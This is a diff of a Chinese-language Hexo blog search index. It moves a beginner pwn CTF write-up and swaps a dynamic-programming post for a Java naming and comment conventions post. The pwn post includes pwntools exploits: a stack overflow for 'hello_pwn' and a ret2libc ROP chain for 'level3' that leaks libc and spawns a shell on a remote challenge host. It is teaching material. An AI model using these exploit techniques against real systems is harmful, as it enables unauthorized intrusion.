@@ -1,6 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+
+<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/checksec.png"></p>
+<p>再看伪代码：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%BA%90%E7%A0%81.png"></p>
+<p>再看偏移量：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/ida.png"></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_checksec.png"></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_IDA.png"></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%9C%B0%E5%9D%80%E8%A7%A3%E9%87%8A%E5%9B%BE.png"></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%A0%88%E4%B8%8A%E5%9B%BE%E5%83%8F.png"></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3>]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java入门基础</title>
     <url>/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p> Java初学，包含使用IDEA创建文件，基本程序等等</p>
@@ -65,76 +110,60 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
-<span id="more"></span>
+    <title>“代码规范”</title>
+    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
+    <content><![CDATA[<span id="more"></span>
 
-<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/checksec.png"></p>
-<p>再看伪代码：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%BA%90%E7%A0%81.png"></p>
-<p>再看偏移量：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/ida.png"></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
 
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_checksec.png"></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/level3_IDA.png"></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
+
+
+<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
 <ul>
-<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+<li>定义：通用的，与业务无关，可供其他项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>例子：字符串类，文件工具类</li>
 </ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E5%9C%B0%E5%9D%80%E8%A7%A3%E9%87%8A%E5%9B%BE.png"></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%A0%88%E4%B8%8A%E5%9B%BE%E5%83%8F.png"></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>tools:</p>
+<ul>
+<li>定义：在当前项目通用；仅能在当前项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>用户校验类，支付工具类</li>
+</ul>
+<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3>]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
-<span id="more"></span>
+<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
-<p>出自洛谷p1216</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94.png"></p>
-<p>具体要求如下：</p>
-<p><img src="https://raw.githubusercontent.com/ZTHLLY/blog_image/main/images/%E6%95%B0%E5%AD%97%E9%87%91%E5%AD%97%E5%A1%94%E5%85%B7%E4%BD%93%E8%A6%81%E6%B1%82.png"></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>常量必须由大写字母和下划线分割单词的方式组成</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
 
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
+
+<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
+<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
+<ul>
+<li>屏蔽不需要执行的代码</li>
+<li>对代码进行解释说明</li>
+</ul>
+<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
+<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> &#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);<span class="keyword">return</span> file;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>算法</tag>
-        <tag>C++</tag>
-      </tags>
   </entry>
   <entry>
     <title>基础算法01</title>
@@ -177,6 +206,33 @@
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span 